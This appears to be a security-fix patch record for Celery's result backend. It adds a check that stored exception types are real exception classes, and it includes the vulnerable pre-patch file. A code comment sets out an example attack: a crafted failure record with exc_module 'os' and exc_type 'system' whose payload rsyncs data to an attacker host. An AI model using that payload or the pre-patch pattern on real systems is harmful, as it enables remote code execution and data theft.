{
    "celery/backends/base.py": {
        "Patch": {
            "0": {
                "beforePatchRowNumber": 25,
                "afterPatchRowNumber": 25,
                "PatchRowcode": " from celery.app.task import Context"
            },
            "1": {
                "beforePatchRowNumber": 26,
                "afterPatchRowNumber": 26,
                "PatchRowcode": " from celery.exceptions import (BackendGetMetaError, BackendStoreError,"
            },
            "2": {
                "beforePatchRowNumber": 27,
                "afterPatchRowNumber": 27,
                "PatchRowcode": "                                ChordError, ImproperlyConfigured,"
            },
            "3": {
                "beforePatchRowNumber": 28,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                               NotRegistered, TaskRevokedError, TimeoutError)"
            },
            "4": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 28,
                "PatchRowcode": "+                               NotRegistered, SecurityError, TaskRevokedError,"
            },
            "5": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 29,
                "PatchRowcode": "+                               TimeoutError)"
            },
            "6": {
                "beforePatchRowNumber": 29,
                "afterPatchRowNumber": 30,
                "PatchRowcode": " from celery.result import (GroupResult, ResultBase, ResultSet,"
            },
            "7": {
                "beforePatchRowNumber": 30,
                "afterPatchRowNumber": 31,
                "PatchRowcode": "                            allow_join_result, result_from_tuple)"
            },
            "8": {
                "beforePatchRowNumber": 31,
                "afterPatchRowNumber": 32,
                "PatchRowcode": " from celery.utils.collections import BufferMap"
            },
            "9": {
                "beforePatchRowNumber": 338,
                "afterPatchRowNumber": 339,
                "PatchRowcode": " "
            },
            "10": {
                "beforePatchRowNumber": 339,
                "afterPatchRowNumber": 340,
                "PatchRowcode": "     def exception_to_python(self, exc):"
            },
            "11": {
                "beforePatchRowNumber": 340,
                "afterPatchRowNumber": 341,
                "PatchRowcode": "         \"\"\"Convert serialized exception to Python exception.\"\"\""
            },
            "12": {
                "beforePatchRowNumber": 341,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-        if exc:"
            },
            "13": {
                "beforePatchRowNumber": 342,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-            if not isinstance(exc, BaseException):"
            },
            "14": {
                "beforePatchRowNumber": 343,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                exc_module = exc.get('exc_module')"
            },
            "15": {
                "beforePatchRowNumber": 344,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                if exc_module is None:"
            },
            "16": {
                "beforePatchRowNumber": 345,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    cls = create_exception_cls("
            },
            "17": {
                "beforePatchRowNumber": 346,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        from_utf8(exc['exc_type']), __name__)"
            },
            "18": {
                "beforePatchRowNumber": 347,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                else:"
            },
            "19": {
                "beforePatchRowNumber": 348,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    exc_module = from_utf8(exc_module)"
            },
            "20": {
                "beforePatchRowNumber": 349,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    exc_type = from_utf8(exc['exc_type'])"
            },
            "21": {
                "beforePatchRowNumber": 350,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    try:"
            },
            "22": {
                "beforePatchRowNumber": 351,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        # Load module and find exception class in that"
            },
            "23": {
                "beforePatchRowNumber": 352,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        cls = sys.modules[exc_module]"
            },
            "24": {
                "beforePatchRowNumber": 353,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        # The type can contain qualified name with parent classes"
            },
            "25": {
                "beforePatchRowNumber": 354,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        for name in exc_type.split('.'):"
            },
            "26": {
                "beforePatchRowNumber": 355,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                            cls = getattr(cls, name)"
            },
            "27": {
                "beforePatchRowNumber": 356,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    except (KeyError, AttributeError):"
            },
            "28": {
                "beforePatchRowNumber": 357,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        cls = create_exception_cls(exc_type,"
            },
            "29": {
                "beforePatchRowNumber": 358,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                                                   celery.exceptions.__name__)"
            },
            "30": {
                "beforePatchRowNumber": 359,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                exc_msg = exc['exc_message']"
            },
            "31": {
                "beforePatchRowNumber": 360,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                try:"
            },
            "32": {
                "beforePatchRowNumber": 361,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    if isinstance(exc_msg, (tuple, list)):"
            },
            "33": {
                "beforePatchRowNumber": 362,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        exc = cls(*exc_msg)"
            },
            "34": {
                "beforePatchRowNumber": 363,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    else:"
            },
            "35": {
                "beforePatchRowNumber": 364,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                        exc = cls(exc_msg)"
            },
            "36": {
                "beforePatchRowNumber": 365,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                except Exception as err:  # noqa"
            },
            "37": {
                "beforePatchRowNumber": 366,
                "afterPatchRowNumber": "",
                "PatchRowcode": "-                    exc = Exception(f'{cls}({exc_msg})')"
            },
            "38": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 342,
                "PatchRowcode": "+        if not exc:"
            },
            "39": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 343,
                "PatchRowcode": "+            return None"
            },
            "40": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 344,
                "PatchRowcode": "+        elif isinstance(exc, BaseException):"
            },
            "41": {
                "beforePatchRowNumber": 367,
                "afterPatchRowNumber": 345,
                "PatchRowcode": "             if self.serializer in EXCEPTION_ABLE_CODECS:"
            },
            "42": {
                "beforePatchRowNumber": 368,
                "afterPatchRowNumber": 346,
                "PatchRowcode": "                 exc = get_pickled_exception(exc)"
            },
            "43": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 347,
                "PatchRowcode": "+            return exc"
            },
            "44": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 348,
                "PatchRowcode": "+        elif not isinstance(exc, dict):"
            },
            "45": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 349,
                "PatchRowcode": "+            try:"
            },
            "46": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 350,
                "PatchRowcode": "+                exc = dict(exc)"
            },
            "47": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 351,
                "PatchRowcode": "+            except TypeError as e:"
            },
            "48": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 352,
                "PatchRowcode": "+                raise TypeError(f\"If the stored exception isn't an \""
            },
            "49": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 353,
                "PatchRowcode": "+                                f\"instance of \""
            },
            "50": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 354,
                "PatchRowcode": "+                                f\"BaseException, it must be a dictionary.\\n\""
            },
            "51": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 355,
                "PatchRowcode": "+                                f\"Instead got: {exc}\") from e"
            },
            "52": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 356,
                "PatchRowcode": "+"
            },
            "53": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 357,
                "PatchRowcode": "+        exc_module = exc.get('exc_module')"
            },
            "54": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 358,
                "PatchRowcode": "+        try:"
            },
            "55": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 359,
                "PatchRowcode": "+            exc_type = exc['exc_type']"
            },
            "56": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 360,
                "PatchRowcode": "+        except KeyError as e:"
            },
            "57": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 361,
                "PatchRowcode": "+            raise ValueError(\"Exception information must include\""
            },
            "58": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 362,
                "PatchRowcode": "+                             \"the exception type\") from e"
            },
            "59": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 363,
                "PatchRowcode": "+        if exc_module is None:"
            },
            "60": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 364,
                "PatchRowcode": "+            cls = create_exception_cls("
            },
            "61": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 365,
                "PatchRowcode": "+                exc_type, __name__)"
            },
            "62": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 366,
                "PatchRowcode": "+        else:"
            },
            "63": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 367,
                "PatchRowcode": "+            try:"
            },
            "64": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 368,
                "PatchRowcode": "+                # Load module and find exception class in that"
            },
            "65": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 369,
                "PatchRowcode": "+                cls = sys.modules[exc_module]"
            },
            "66": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 370,
                "PatchRowcode": "+                # The type can contain qualified name with parent classes"
            },
            "67": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 371,
                "PatchRowcode": "+                for name in exc_type.split('.'):"
            },
            "68": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 372,
                "PatchRowcode": "+                    cls = getattr(cls, name)"
            },
            "69": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 373,
                "PatchRowcode": "+            except (KeyError, AttributeError):"
            },
            "70": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 374,
                "PatchRowcode": "+                cls = create_exception_cls(exc_type,"
            },
            "71": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 375,
                "PatchRowcode": "+                                           celery.exceptions.__name__)"
            },
            "72": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 376,
                "PatchRowcode": "+        exc_msg = exc.get('exc_message', '')"
            },
            "73": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 377,
                "PatchRowcode": "+"
            },
            "74": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 378,
                "PatchRowcode": "+        # If the recreated exception type isn't indeed an exception,"
            },
            "75": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 379,
                "PatchRowcode": "+        # this is a security issue. Without the condition below, an attacker"
            },
            "76": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 380,
                "PatchRowcode": "+        # could exploit a stored command vulnerability to execute arbitrary"
            },
            "77": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 381,
                "PatchRowcode": "+        # python code such as:"
            },
            "78": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 382,
                "PatchRowcode": "+        # os.system(\"rsync /data attacker@192.168.56.100:~/data\")"
            },
            "79": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 383,
                "PatchRowcode": "+        # The attacker sets the task's result to a failure in the result"
            },
            "80": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 384,
                "PatchRowcode": "+        # backend with the os as the module, the system function as the"
            },
            "81": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 385,
                "PatchRowcode": "+        # exception type and the payload"
            },
            "82": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 386,
                "PatchRowcode": "+        # rsync /data attacker@192.168.56.100:~/data"
            },
            "83": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 387,
                "PatchRowcode": "+        # as the exception arguments like so:"
            },
            "84": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 388,
                "PatchRowcode": "+        # {"
            },
            "85": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 389,
                "PatchRowcode": "+        #   \"exc_module\": \"os\","
            },
            "86": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 390,
                "PatchRowcode": "+        #   \"exc_type\": \"system\","
            },
            "87": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 391,
                "PatchRowcode": "+        #   \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\""
            },
            "88": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 392,
                "PatchRowcode": "+        # }"
            },
            "89": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 393,
                "PatchRowcode": "+        if not isinstance(cls, type) or not issubclass(cls, BaseException):"
            },
            "90": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 394,
                "PatchRowcode": "+            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'"
            },
            "91": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 395,
                "PatchRowcode": "+            raise SecurityError("
            },
            "92": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 396,
                "PatchRowcode": "+                f\"Expected an exception class, got {fake_exc_type} with payload {exc_msg}\")"
            },
            "93": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 397,
                "PatchRowcode": "+"
            },
            "94": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 398,
                "PatchRowcode": "+        # XXX: Without verifying `cls` is actually an exception class,"
            },
            "95": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 399,
                "PatchRowcode": "+        #      an attacker could execute arbitrary python code."
            },
            "96": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 400,
                "PatchRowcode": "+        #      cls could be anything, even eval()."
            },
            "97": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 401,
                "PatchRowcode": "+        try:"
            },
            "98": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 402,
                "PatchRowcode": "+            if isinstance(exc_msg, (tuple, list)):"
            },
            "99": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 403,
                "PatchRowcode": "+                exc = cls(*exc_msg)"
            },
            "100": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 404,
                "PatchRowcode": "+            else:"
            },
            "101": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 405,
                "PatchRowcode": "+                exc = cls(exc_msg)"
            },
            "102": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 406,
                "PatchRowcode": "+        except Exception as err:  # noqa"
            },
            "103": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 407,
                "PatchRowcode": "+            exc = Exception(f'{cls}({exc_msg})')"
            },
            "104": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 408,
                "PatchRowcode": "+"
            },
            "105": {
                "beforePatchRowNumber": 369,
                "afterPatchRowNumber": 409,
                "PatchRowcode": "         return exc"
            },
            "106": {
                "beforePatchRowNumber": 370,
                "afterPatchRowNumber": 410,
                "PatchRowcode": " "
            },
            "107": {
                "beforePatchRowNumber": 371,
                "afterPatchRowNumber": 411,
                "PatchRowcode": "     def prepare_value(self, result):"
            }
        },
        "frontPatchFile": [
            "\"\"\"Result backend base classes.",
            "",
            "- :class:`BaseBackend` defines the interface.",
            "",
            "- :class:`KeyValueStoreBackend` is a common base class",
            "    using K/V semantics like _get and _put.",
            "\"\"\"",
            "import sys",
            "import time",
            "import warnings",
            "from collections import namedtuple",
            "from datetime import datetime, timedelta",
            "from functools import partial",
            "from weakref import WeakValueDictionary",
            "",
            "from billiard.einfo import ExceptionInfo",
            "from kombu.serialization import dumps, loads, prepare_accept_content",
            "from kombu.serialization import registry as serializer_registry",
            "from kombu.utils.encoding import bytes_to_str, ensure_bytes, from_utf8",
            "from kombu.utils.url import maybe_sanitize_url",
            "",
            "import celery.exceptions",
            "from celery import current_app, group, maybe_signature, states",
            "from celery._state import get_current_task",
            "from celery.app.task import Context",
            "from celery.exceptions import (BackendGetMetaError, BackendStoreError,",
            "                               ChordError, ImproperlyConfigured,",
            "                               NotRegistered, TaskRevokedError, TimeoutError)",
            "from celery.result import (GroupResult, ResultBase, ResultSet,",
            "                           allow_join_result, result_from_tuple)",
            "from celery.utils.collections import BufferMap",
            "from celery.utils.functional import LRUCache, arity_greater",
            "from celery.utils.log import get_logger",
            "from celery.utils.serialization import (create_exception_cls,",
            "                                        ensure_serializable,",
            "                                        get_pickleable_exception,",
            "                                        get_pickled_exception,",
            "                                        raise_with_context)",
            "from celery.utils.time import get_exponential_backoff_interval",
            "",
            "__all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')",
            "",
            "EXCEPTION_ABLE_CODECS = frozenset({'pickle'})",
            "",
            "logger = get_logger(__name__)",
            "",
            "MESSAGE_BUFFER_MAX = 8192",
            "",
            "pending_results_t = namedtuple('pending_results_t', (",
            "    'concrete', 'weak',",
            "))",
            "",
            "E_NO_BACKEND = \"\"\"",
            "No result backend is configured.",
            "Please see the documentation for more information.",
            "\"\"\"",
            "",
            "E_CHORD_NO_BACKEND = \"\"\"",
            "Starting chords requires a result backend to be configured.",
            "",
            "Note that a group chained with a task is also upgraded to be a chord,",
            "as this pattern requires synchronization.",
            "",
            "Result backends that supports chords: Redis, Database, Memcached, and more.",
            "\"\"\"",
            "",
            "",
            "def unpickle_backend(cls, args, kwargs):",
            "    \"\"\"Return an unpickled backend.\"\"\"",
            "    return cls(*args, app=current_app._get_current_object(), **kwargs)",
            "",
            "",
            "class _nulldict(dict):",
            "    def ignore(self, *a, **kw):",
            "        pass",
            "",
            "    __setitem__ = update = setdefault = ignore",
            "",
            "",
            "def _is_request_ignore_result(request):",
            "    if request is None:",
            "        return False",
            "    return request.ignore_result",
            "",
            "",
            "class Backend:",
            "    READY_STATES = states.READY_STATES",
            "    UNREADY_STATES = states.UNREADY_STATES",
            "    EXCEPTION_STATES = states.EXCEPTION_STATES",
            "",
            "    TimeoutError = TimeoutError",
            "",
            "    #: Time to sleep between polling each individual item",
            "    #: in `ResultSet.iterate`. as opposed to the `interval`",
            "    #: argument which is for each pass.",
            "    subpolling_interval = None",
            "",
            "    #: If true the backend must implement :meth:`get_many`.",
            "    supports_native_join = False",
            "",
            "    #: If true the backend must automatically expire results.",
            "    #: The daily backend_cleanup periodic task won't be triggered",
            "    #: in this case.",
            "    supports_autoexpire = False",
            "",
            "    #: Set to true if the backend is persistent by default.",
            "    persistent = True",
            "",
            "    retry_policy = {",
            "        'max_retries': 20,",
            "        'interval_start': 0,",
            "        'interval_step': 1,",
            "        'interval_max': 1,",
            "    }",
            "",
            "    def __init__(self, app,",
            "                 serializer=None, max_cached_results=None, accept=None,",
            "                 expires=None, expires_type=None, url=None, **kwargs):",
            "        self.app = app",
            "        conf = self.app.conf",
            "        self.serializer = serializer or conf.result_serializer",
            "        (self.content_type,",
            "         self.content_encoding,",
            "         self.encoder) = serializer_registry._encoders[self.serializer]",
            "        cmax = max_cached_results or conf.result_cache_max",
            "        self._cache = _nulldict() if cmax == -1 else LRUCache(limit=cmax)",
            "",
            "        self.expires = self.prepare_expires(expires, expires_type)",
            "",
            "        # precedence: accept, conf.result_accept_content, conf.accept_content",
            "        self.accept = conf.result_accept_content if accept is None else accept",
            "        self.accept = conf.accept_content if self.accept is None else self.accept",
            "        self.accept = prepare_accept_content(self.accept)",
            "",
            "        self.always_retry = conf.get('result_backend_always_retry', False)",
            "        self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)",
            "        self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)",
            "        self.max_retries = conf.get('result_backend_max_retries', float(\"inf\"))",
            "",
            "        self._pending_results = pending_results_t({}, WeakValueDictionary())",
            "        self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)",
            "        self.url = url",
            "",
            "    def as_uri(self, include_password=False):",
            "        \"\"\"Return the backend as an URI, sanitizing the password or not.\"\"\"",
            "        # when using maybe_sanitize_url(), \"/\" is added",
            "        # we're stripping it for consistency",
            "        if include_password:",
            "            return self.url",
            "        url = maybe_sanitize_url(self.url or '')",
            "        return url[:-1] if url.endswith(':///') else url",
            "",
            "    def mark_as_started(self, task_id, **meta):",
            "        \"\"\"Mark a task as started.\"\"\"",
            "        return self.store_result(task_id, meta, states.STARTED)",
            "",
            "    def mark_as_done(self, task_id, result,",
            "                     request=None, store_result=True, state=states.SUCCESS):",
            "        \"\"\"Mark task as successfully executed.\"\"\"",
            "        if (store_result and not _is_request_ignore_result(request)):",
            "            self.store_result(task_id, result, state, request=request)",
            "        if request and request.chord:",
            "            self.on_chord_part_return(request, state, result)",
            "",
            "    def mark_as_failure(self, task_id, exc,",
            "                        traceback=None, request=None,",
            "                        store_result=True, call_errbacks=True,",
            "                        state=states.FAILURE):",
            "        \"\"\"Mark task as executed with failure.\"\"\"",
            "        if store_result:",
            "            self.store_result(task_id, exc, state,",
            "                              traceback=traceback, request=request)",
            "        if request:",
            "            # This task may be part of a chord",
            "            if request.chord:",
            "                self.on_chord_part_return(request, state, exc)",
            "            # It might also have chained tasks which need to be propagated to,",
            "            # this is most likely to be exclusive with being a direct part of a",
            "            # chord but we'll handle both cases separately.",
            "            #",
            "            # The `chain_data` try block here is a bit tortured since we might",
            "            # have non-iterable objects here in tests and it's easier this way.",
            "            try:",
            "                chain_data = iter(request.chain)",
            "            except (AttributeError, TypeError):",
            "                chain_data = tuple()",
            "            for chain_elem in chain_data:",
            "                # Reconstruct a `Context` object for the chained task which has",
            "                # enough information to for backends to work with",
            "                chain_elem_ctx = Context(chain_elem)",
            "                chain_elem_ctx.update(chain_elem_ctx.options)",
            "                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')",
            "                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')",
            "                # If the state should be propagated, we'll do so for all",
            "                # elements of the chain. This is only truly important so",
            "                # that the last chain element which controls completion of",
            "                # the chain itself is marked as completed to avoid stalls.",
            "                #",
            "                # Some chained elements may be complex signatures and have no",
            "                # task ID of their own, so we skip them hoping that not",
            "                # descending through them is OK. If the last chain element is",
            "                # complex, we assume it must have been uplifted to a chord by",
            "                # the canvas code and therefore the condition below will ensure",
            "                # that we mark something as being complete as avoid stalling.",
            "                if (",
            "                    store_result and state in states.PROPAGATE_STATES and",
            "                    chain_elem_ctx.task_id is not None",
            "                ):",
            "                    self.store_result(",
            "                        chain_elem_ctx.task_id, exc, state,",
            "                        traceback=traceback, request=chain_elem_ctx,",
            "                    )",
            "                # If the chain element is a member of a chord, we also need",
            "                # to call `on_chord_part_return()` as well to avoid stalls.",
            "                if 'chord' in chain_elem_ctx.options:",
            "                    self.on_chord_part_return(chain_elem_ctx, state, exc)",
            "            # And finally we'll fire any errbacks",
            "            if call_errbacks and request.errbacks:",
            "                self._call_task_errbacks(request, exc, traceback)",
            "",
            "    def _call_task_errbacks(self, request, exc, traceback):",
            "        old_signature = []",
            "        for errback in request.errbacks:",
            "            errback = self.app.signature(errback)",
            "            if not errback._app:",
            "                # Ensure all signatures have an application",
            "                errback._app = self.app",
            "            try:",
            "                if (",
            "                        # Celery tasks type created with the @task decorator have",
            "                        # the __header__ property, but Celery task created from",
            "                        # Task class do not have this property.",
            "                        # That's why we have to check if this property exists",
            "                        # before checking is it partial function.",
            "                        hasattr(errback.type, '__header__') and",
            "",
            "                        # workaround to support tasks with bind=True executed as",
            "                        # link errors. Otherwise retries can't be used",
            "                        not isinstance(errback.type.__header__, partial) and",
            "                        arity_greater(errback.type.__header__, 1)",
            "                ):",
            "                    errback(request, exc, traceback)",
            "                else:",
            "                    old_signature.append(errback)",
            "            except NotRegistered:",
            "                # Task may not be present in this worker.",
            "                # We simply send it forward for another worker to consume.",
            "                # If the task is not registered there, the worker will raise",
            "                # NotRegistered.",
            "                old_signature.append(errback)",
            "",
            "        if old_signature:",
            "            # Previously errback was called as a task so we still",
            "            # need to do so if the errback only takes a single task_id arg.",
            "            task_id = request.id",
            "            root_id = request.root_id or task_id",
            "            g = group(old_signature, app=self.app)",
            "            if self.app.conf.task_always_eager or request.delivery_info.get('is_eager', False):",
            "                g.apply(",
            "                    (task_id,), parent_id=task_id, root_id=root_id",
            "                )",
            "            else:",
            "                g.apply_async(",
            "                    (task_id,), parent_id=task_id, root_id=root_id",
            "                )",
            "",
            "    def mark_as_revoked(self, task_id, reason='',",
            "                        request=None, store_result=True, state=states.REVOKED):",
            "        exc = TaskRevokedError(reason)",
            "        if store_result:",
            "            self.store_result(task_id, exc, state,",
            "                              traceback=None, request=request)",
            "        if request and request.chord:",
            "            self.on_chord_part_return(request, state, exc)",
            "",
            "    def mark_as_retry(self, task_id, exc, traceback=None,",
            "                      request=None, store_result=True, state=states.RETRY):",
            "        \"\"\"Mark task as being retries.",
            "",
            "        Note:",
            "            Stores the current exception (if any).",
            "        \"\"\"",
            "        return self.store_result(task_id, exc, state,",
            "                                 traceback=traceback, request=request)",
            "",
            "    def chord_error_from_stack(self, callback, exc=None):",
            "        app = self.app",
            "        try:",
            "            backend = app._tasks[callback.task].backend",
            "        except KeyError:",
            "            backend = self",
            "        # We have to make a fake request since either the callback failed or",
            "        # we're pretending it did since we don't have information about the",
            "        # chord part(s) which failed. This request is constructed as a best",
            "        # effort for new style errbacks and may be slightly misleading about",
            "        # what really went wrong, but at least we call them!",
            "        fake_request = Context({",
            "            \"id\": callback.options.get(\"task_id\"),",
            "            \"errbacks\": callback.options.get(\"link_error\", []),",
            "            \"delivery_info\": dict(),",
            "            **callback",
            "        })",
            "        try:",
            "            self._call_task_errbacks(fake_request, exc, None)",
            "        except Exception as eb_exc:  # pylint: disable=broad-except",
            "            return backend.fail_from_current_stack(callback.id, exc=eb_exc)",
            "        else:",
            "            return backend.fail_from_current_stack(callback.id, exc=exc)",
            "",
            "    def fail_from_current_stack(self, task_id, exc=None):",
            "        type_, real_exc, tb = sys.exc_info()",
            "        try:",
            "            exc = real_exc if exc is None else exc",
            "            exception_info = ExceptionInfo((type_, exc, tb))",
            "            self.mark_as_failure(task_id, exc, exception_info.traceback)",
            "            return exception_info",
            "        finally:",
            "            while tb is not None:",
            "                try:",
            "                    tb.tb_frame.clear()",
            "                    tb.tb_frame.f_locals",
            "                except RuntimeError:",
            "                    # Ignore the exception raised if the frame is still executing.",
            "                    pass",
            "                tb = tb.tb_next",
            "",
            "            del tb",
            "",
            "    def prepare_exception(self, exc, serializer=None):",
            "        \"\"\"Prepare exception for serialization.\"\"\"",
            "        serializer = self.serializer if serializer is None else serializer",
            "        if serializer in EXCEPTION_ABLE_CODECS:",
            "            return get_pickleable_exception(exc)",
            "        exctype = type(exc)",
            "        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),",
            "                'exc_message': ensure_serializable(exc.args, self.encode),",
            "                'exc_module': exctype.__module__}",
            "",
            "    def exception_to_python(self, exc):",
            "        \"\"\"Convert serialized exception to Python exception.\"\"\"",
            "        if exc:",
            "            if not isinstance(exc, BaseException):",
            "                exc_module = exc.get('exc_module')",
            "                if exc_module is None:",
            "                    cls = create_exception_cls(",
            "                        from_utf8(exc['exc_type']), __name__)",
            "                else:",
            "                    exc_module = from_utf8(exc_module)",
            "                    exc_type = from_utf8(exc['exc_type'])",
            "                    try:",
            "                        # Load module and find exception class in that",
            "                        cls = sys.modules[exc_module]",
            "                        # The type can contain qualified name with parent classes",
            "                        for name in exc_type.split('.'):",
            "                            cls = getattr(cls, name)",
            "                    except (KeyError, AttributeError):",
            "                        cls = create_exception_cls(exc_type,",
            "                                                   celery.exceptions.__name__)",
            "                exc_msg = exc['exc_message']",
            "                try:",
            "                    if isinstance(exc_msg, (tuple, list)):",
            "                        exc = cls(*exc_msg)",
            "                    else:",
            "                        exc = cls(exc_msg)",
            "                except Exception as err:  # noqa",
            "                    exc = Exception(f'{cls}({exc_msg})')",
            "            if self.serializer in EXCEPTION_ABLE_CODECS:",
            "                exc = get_pickled_exception(exc)",
            "        return exc",
            "",
            "    def prepare_value(self, result):",
            "        \"\"\"Prepare value for storage.\"\"\"",
            "        if self.serializer != 'pickle' and isinstance(result, ResultBase):",
            "            return result.as_tuple()",
            "        return result",
            "",
            "    def encode(self, data):",
            "        _, _, payload = self._encode(data)",
            "        return payload",
            "",
            "    def _encode(self, data):",
            "        return dumps(data, serializer=self.serializer)",
            "",
            "    def meta_from_decoded(self, meta):",
            "        if meta['status'] in self.EXCEPTION_STATES:",
            "            meta['result'] = self.exception_to_python(meta['result'])",
            "        return meta",
            "",
            "    def decode_result(self, payload):",
            "        return self.meta_from_decoded(self.decode(payload))",
            "",
            "    def decode(self, payload):",
            "        if payload is None:",
            "            return payload",
            "        payload = payload or str(payload)",
            "        return loads(payload,",
            "                     content_type=self.content_type,",
            "                     content_encoding=self.content_encoding,",
            "                     accept=self.accept)",
            "",
            "    def prepare_expires(self, value, type=None):",
            "        if value is None:",
            "            value = self.app.conf.result_expires",
            "        if isinstance(value, timedelta):",
            "            value = value.total_seconds()",
            "        if value is not None and type:",
            "            return type(value)",
            "        return value",
            "",
            "    def prepare_persistent(self, enabled=None):",
            "        if enabled is not None:",
            "            return enabled",
            "        persistent = self.app.conf.result_persistent",
            "        return self.persistent if persistent is None else persistent",
            "",
            "    def encode_result(self, result, state):",
            "        if state in self.EXCEPTION_STATES and isinstance(result, Exception):",
            "            return self.prepare_exception(result)",
            "        return self.prepare_value(result)",
            "",
            "    def is_cached(self, task_id):",
            "        return task_id in self._cache",
            "",
            "    def _get_result_meta(self, result,",
            "                         state, traceback, request, format_date=True,",
            "                         encode=False):",
            "        if state in self.READY_STATES:",
            "            date_done = datetime.utcnow()",
            "            if format_date:",
            "                date_done = date_done.isoformat()",
            "        else:",
            "            date_done = None",
            "",
            "        meta = {",
            "            'status': state,",
            "            'result': result,",
            "            'traceback': traceback,",
            "            'children': self.current_task_children(request),",
